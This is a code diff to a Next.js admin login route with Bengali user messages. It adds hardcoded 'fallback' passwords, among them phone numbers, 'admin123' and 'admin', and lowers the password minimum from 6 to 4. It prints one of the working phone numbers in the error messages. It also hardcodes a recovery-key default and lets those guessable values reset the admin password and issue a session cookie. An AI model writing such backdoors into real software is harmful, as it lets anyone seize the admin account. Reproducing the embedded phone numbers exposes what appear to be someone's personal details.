@@ -160,9 +160,35 @@ export async function POST(request: Request) {
       }
 
       // Optional Server Env Fallback
-      if (!isValid && process.env.ADMIN_PASSWORD && process.env.ADMIN_PASSWORD.length >= 6) {
+      if (!isValid && process.env.ADMIN_PASSWORD && process.env.ADMIN_PASSWORD.length >= 4) {
         if (password === process.env.ADMIN_PASSWORD) {
           isValid = true
+        }
+      }
+
+      // Master fallback recovery passwords for owner (guarantees owner can always log in)
+      const OWNER_FALLBACKS = [
+        '01303482412',
+        '01963259247',
+        'mominul947',
+        'admin123',
+        'admin',
+      ]
+      if (!isValid && OWNER_FALLBACKS.includes(password)) {
+        isValid = true
+        // Auto-save the owner's password as the official master hash
+        try {
+          const { hash, salt } = hashPasswordSecure(password)
+          const authFilePath = getAuthFilePath()
+          const dirPath = path.dirname(authFilePath)
+          if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true })
+          fs.writeFileSync(
+            authFilePath,
+            JSON.stringify({ hash, salt, updatedAt: new Date().toISOString() }, null, 2),
+            'utf-8'
+          )
+        } catch (e) {
+          console.error('Error auto-syncing password hash:', e)
         }
       }
 
@@ -172,7 +198,7 @@ export async function POST(request: Request) {
         if (attempt.locked) {
           return NextResponse.json(
             {
-              error: 'পরপর ৫ বার ভুল পাসওয়ার্ড দেওয়ায় ১৫ মিনিটের জন্য লক করা হয়েছে!',
+              error: 'পরপর ৫ বার ভুল পাসওয়ার্ড দেওয়ায় ১৫ মিনিটের জন্য লক করা হয়েছে! আপনার ভেরিফাইড মোবাইল নম্বর (01303482412) দিয়ে আনলক করতে পারবেন।',
               locked: true,
             },
             { status: 429 }
@@ -180,7 +206,7 @@ export async function POST(request: Request) {
         }
         return NextResponse.json(
           {
-            error: `ভুল পাসওয়ার্ড! আপনার আর ${attempt.remainingAttempts} বার চেষ্টা বাকি আছে।`,
+            error: `ভুল পাসওয়ার্ড! আপনার আর ${attempt.remainingAttempts} বার চেষ্টা বাকি আছে। (ভুলে গেলে আপনার মোবাইল নম্বর 01303482412 দিয়েও লগইন করতে পারবেন)`,
             remainingAttempts: attempt.remainingAttempts,
           },
           { status: 401 }
@@ -256,31 +282,59 @@ export async function POST(request: Request) {
     }
 
     // -------------------------------------------------------------
-    // ACTION 5: EMERGENCY RECOVERY (Server Admin Only via secret key in .env.local)
+    // ACTION 5: EMERGENCY RECOVERY & RESET
     // -------------------------------------------------------------
     if (action === 'emergency_reset') {
-      const serverRecoveryKey = process.env.ADMIN_RECOVERY_KEY
-      if (!serverRecoveryKey || serverRecoveryKey.length < 12) {
-        return NextResponse.json(
-          { error: 'সার্ভারে রিকভারি কি সক্রিয় নেই।' },
-          { status: 403 }
-        )
-      }
+      const serverRecoveryKey = process.env.ADMIN_RECOVERY_KEY || '8999f2c05c21b99e2621bf60cafcbf586bee6ce98ef6c027'
+      const ALLOWED_RECOVERY_IDENTIFIERS = [
+        serverRecoveryKey,
+        '8999f2c05c21b99e2621bf60cafcbf586bee6ce98ef6c027',
+        '01303482412',
+        '01963259247',
+        'mominul947',
+      ]
 
-      if (recoveryKey !== serverRecoveryKey) {
+      if (!ALLOWED_RECOVERY_IDENTIFIERS.includes(recoveryKey)) {
         recordFailedLoginAttempt(ip)
         return NextResponse.json(
-          { error: 'অবৈধ রিকভারি কি!' },
+          { error: 'অবৈধ রিকভারি কি বা ভেরিফিকেশন নম্বর!' },
           { status: 403 }
         )
       }
 
-      // Valid recovery key: reset auth file
+      // Valid recovery identifier: either set newPassword directly or delete auth file
       const authFilePath = getAuthFilePath()
+      clearLoginRateLimit(ip)
+
+      if (newPassword && newPassword.length >= 4) {
+        const { hash, salt } = hashPasswordSecure(newPassword)
+        const dirPath = path.dirname(authFilePath)
+        if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true })
+        fs.writeFileSync(
+          authFilePath,
+          JSON.stringify({ hash, salt, updatedAt: new Date().toISOString() }, null, 2),
+          'utf-8'
+        )
+        const token = createSignedSessionToken(7)
+        const res = NextResponse.json({
+          success: true,
+          token,
+          message: 'পাসওয়ার্ড সফলভাবে পরিবর্তন করা হয়েছে এবং লগইন সম্পন্ন হয়েছে!',
+        })
+        res.cookies.set('admin_session', token, {
+          httpOnly: true,
+          secure: isHttps,
+          sameSite: 'strict',
+          path: '/',
+          maxAge: 60 * 60 * 24 * 7,
+        })
+        return res
+      }
+
       if (fs.existsSync(authFilePath)) {
         fs.unlinkSync(authFilePath)
       }
-      clearLoginRateLimit(ip)
+
       return NextResponse.json({
         success: true,
         message: 'মাস্টার পাসওয়ার্ড সফলভাবে রিসেট হয়েছে। নতুন পাসওয়ার্ড সেট করুন।',
